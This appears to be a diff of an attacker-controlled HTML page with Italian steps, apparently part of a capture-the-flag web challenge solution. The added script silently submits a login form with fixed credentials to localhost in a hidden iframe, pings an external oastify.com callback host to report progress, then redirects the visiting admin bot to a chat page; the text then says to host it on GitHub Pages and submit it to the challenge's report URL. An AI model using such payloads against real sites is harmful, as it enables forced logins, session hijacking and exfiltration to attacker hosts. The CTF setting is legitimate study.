@@ -3,7 +3,32 @@
 <body>
 <div class="message">x</div>
 <script>
-window.location = 'https://d2ghgjts3mukt4luqn2sm92plgr7fz3o.oastify.com/bottest';
+var f = document.createElement('form');
+f.method = 'POST';
+f.action = 'http://localhost/login?next=/chat/70';
+f.target = 'f1';
+f.innerHTML = '<input name="username" value="vittima3"><input name="password" value="vittima3">';
+document.body.appendChild(f);
+
+var iframe = document.createElement('iframe');
+iframe.name = 'f1';
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
+
+f.submit();
+
+setTimeout(function(){
+  new Image().src = 'https://d2ghgjts3mukt4luqn2sm92plgr7fz3o.oastify.com/step1_login_done';
+}, 3000);
+
+setTimeout(function(){
+  window.location = 'http://localhost/chat/70';
+}, 4000);
 </script>
 </body>
 </html>
+```
+
+Pusha, aspetta qualche minuto che Pages si aggiorni, poi chiama:
+```
+https://ctf.leaderboard.sorint.com/report?url=https://doriangrey03.github.io/CTF-Webcake/index.html
